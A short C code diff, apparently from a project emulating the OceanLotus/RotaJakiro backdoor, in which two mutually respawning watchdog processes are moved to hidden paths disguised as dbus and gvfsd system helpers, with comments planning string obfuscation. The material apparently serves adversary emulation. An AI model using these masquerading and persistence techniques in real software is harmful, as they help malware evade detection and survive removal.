@@ -413,7 +413,8 @@ void *watchdog_process_shmget(void *fpath) {
                     getpid(),
                     upper_bytes);
 
-            char* argument_list[] = {"/bin/sh", "-c", "/home/gdev/OL/ocean-lotus/rota/shmread", "&", NULL}; // NULL terminated array of char* strings
+            // TODO - stack string file path  and dynamically resolve it.
+            char* argument_list[] = {"/bin/sh", "-c", "/home/gdev/.dbus/sessions/session-dbus", "&", NULL}; // NULL terminated array of char* strings
             int f_pid = fork();
             if (f_pid == 0) {
                 execvp("/bin/sh", argument_list);
@@ -489,7 +490,8 @@ void *watchdog_process_shmread(void *fpath) {
             fprintf(stderr, "[shmread] (%d) process id %d is not alive! spawning\n", getpid(), *tmpPid);
             #endif
 
-            char* argument_list[] = {"/bin/sh", "-c", "/home/gdev/OL/ocean-lotus/rota/shmwrite", "&", NULL}; // NULL terminated array of char* strings
+            // TODO - stack string file path  and dynamically resolve it.
+            char* argument_list[] = {"/bin/sh", "-c", "/home/gdev/.gvfsd/.profile/gvfsd-helper", "&", NULL}; // NULL terminated array of char* strings
             int f_pid = fork();
             if (f_pid == 0) {
                 execvp("/bin/sh", argument_list);
